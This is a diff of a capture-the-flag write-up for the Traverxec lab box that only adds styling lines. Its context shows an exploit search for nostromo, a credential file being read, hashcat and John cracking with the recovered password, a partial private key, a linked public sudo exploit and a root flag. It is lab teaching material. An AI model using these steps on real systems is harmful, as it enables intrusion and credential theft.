@@ -12,6 +12,7 @@ image:
 IP : 10.10.10.165
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -33,6 +34,7 @@ PORT   STATE SERVICE VERSION
 Service Info: ; CPE: cpe:/o:linux:linux_kernel
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -50,6 +52,7 @@ nostromo 1.9.6 - Remote Code Execution          | multiple/remote/47837.py]
 ------------------------------------------------ ---------------------------------
 Shellcodes: No Results
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets try it out now →
@@ -76,6 +79,7 @@ Connection: close
 www-data
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now lets try reverse shell command execution from it →
 
@@ -97,6 +101,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@traverxec:/usr/bin$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Found something interesting →
 
@@ -105,6 +110,7 @@ www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 www-data@traverxec:/var/nostromo/conf$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now with the help of hashcat I decoded the password of david →
@@ -115,12 +121,14 @@ hashes.txt = $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 commands : hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 {: .nolineno}
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%202.png)
 
 ```bash
 $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
 ```
+{: .nolineno}
 {: .nolineno}
 
 But each time I use this password it says invalid →
@@ -131,6 +139,7 @@ Password:
 su: Authentication failure
 www-data@traverxec:/home$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets find something else →
@@ -157,6 +166,7 @@ drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
 www-data@traverxec:/home/david$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now lets see inside the `backup-ssh-identity-files.tgz` file →
 
@@ -170,12 +180,14 @@ drwx------ david/david       0 2019-10-25 17:02 home/david/.ssh/
 www-data@traverxec:/home/david$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now if I can extract data so extract at /tmp/Data location so for that I used this command →
 
 ```bash
 tar zxvf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -C /tmp/Data
 ```
+{: .nolineno}
 {: .nolineno}
 
 ```bash
@@ -189,6 +201,7 @@ www-data@traverxec:/tmp/Data$ find .
 ./home/david/.ssh/id_rsa.pub
 www-data@traverxec:/tmp/Data$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets see the `id_rsa` file here →
@@ -228,6 +241,7 @@ VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w]
 www-data@traverxec:/tmp/Data/home/david/.ssh$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Lets see the paraphrase of `id_rsa` from cracking it through `john the ripper` →
 
@@ -257,6 +271,7 @@ david@traverxec:~$ cat user.txt
 david@traverxec:~$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I find the version of sudo outdated so I tried this exploit directly and I got what I wanted →
 [exploit_nss.py File](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)
@@ -269,6 +284,7 @@ Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.27
 www-data@traverxec:/$
 ```
+{: .nolineno}
 {: .nolineno}
 
 ```bash
@@ -293,6 +309,7 @@ root@traverxec:/root# cat root.txt
 f0310cddcfa7d2fa7927fead112c5bf3
 root@traverxec:/root#
 ```
+{: .nolineno}
 
 > If you have any questions or suggestions, please leave a comment below.
 Thank You ! 
